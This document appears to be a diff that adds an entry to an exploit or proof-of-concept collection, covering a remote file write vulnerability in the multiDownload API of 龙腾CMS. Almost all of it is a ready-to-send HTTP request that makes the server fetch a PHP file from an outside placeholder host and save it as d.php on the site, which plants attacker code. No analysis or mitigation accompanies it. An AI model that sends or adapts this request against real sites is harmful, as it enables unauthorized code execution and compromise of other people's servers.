@@ -1,0 +1,8 @@
+# 龙腾CMS /api/file/multiDownload 存在远程文件写入漏洞
+GET /api/file/multiDownload?file=http://hostname.domain/c.php&savePath=d.php&_ZQA_ID={ZQA_ID} HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+Accept-Encoding: identity
+Accept: */*
+Connection: keep-alive
+
